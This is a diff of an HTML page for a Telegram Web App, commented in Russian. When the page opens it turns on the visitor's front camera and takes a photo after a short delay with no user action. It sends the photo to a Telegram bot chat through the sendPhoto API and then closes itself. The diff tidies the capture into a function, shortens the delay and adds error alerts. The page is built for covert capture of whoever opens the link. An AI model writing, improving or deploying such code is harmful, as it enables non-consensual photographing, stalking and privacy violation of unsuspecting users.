@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🫣</title>
+    <title>Telegram Photo Capture</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
@@ -24,62 +24,73 @@
 
         tg.expand(); // Расширение Web App на весь экран
 
-        // Захват фото и отправка
+        // Функция для захвата и отправки фото
+        function captureAndSendPhoto(video, canvas) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Рисуем изображение на canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Получаем изображение в формате base64
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // Конвертация base64 в blob и отправка в Telegram
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+
+                    // Отправка изображения
+                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Photo sent successfully!");
+                        tg.close(); // Закрыть Web App после отправки
+                    } else {
+                        console.error("Failed to send photo:", data.description);
+                        alert("Ошибка отправки фото: " + data.description);
+                        tg.close();
+                    }
+                })
+                .catch(err => {
+                    console.error("Error:", err);
+                    alert("Произошла ошибка при отправке фото.");
+                    tg.close();
+                });
+        }
+
         window.onload = () => {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
 
-            // Доступ к камере
+            // Активируем поток видео
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     video.srcObject = stream;
 
-                    // Автоматический захват изображения
+                    // Ждем загрузки метаданных для получения размеров видео
                     video.onloadedmetadata = () => {
-                        const context = canvas.getContext('2d');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
+                        video.play();
 
-                        // Небольшая задержка для корректной активации камеры
+                        // Небольшая задержка перед захватом изображения
                         setTimeout(() => {
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            const imageData = canvas.toDataURL('image/jpeg');
-
-                            // Конвертация base64 в файл и отправка в Telegram
-                            fetch(imageData)
-                                .then(res => res.blob())
-                                .then(blob => {
-                                    const formData = new FormData();
-                                    formData.append('chat_id', CHAT_ID);
-                                    formData.append('photo', blob, 'photo.jpg');
-
-                                    // Отправка изображения
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    })
-                                    .then(response => response.json())
-                                    .then(data => {
-                                        if (data.ok) {
-                                            console.log("Photo sent successfully!");
-                                            tg.close(); // Закрыть Web App после отправки
-                                        } else {
-                                            console.error("Failed to send photo:", data.description);
-                                            tg.close();
-                                        }
-                                    })
-                                    .catch(err => {
-                                        console.error("Error:", err);
-                                        tg.close();
-                                    });
-                                });
-                        }, 1000); // Задержка в 1 секунду
+                            captureAndSendPhoto(video, canvas);
+                        }, 500); // Задержка в 0.5 секунды
                     };
                 })
                 .catch(err => {
                     console.error("Camera error:", err);
-                    tg.close(); // Закрыть Web App при ошибке
+                    alert("Ошибка доступа к камере. Проверьте настройки.");
+                    tg.close();
                 });
         };
     </script>
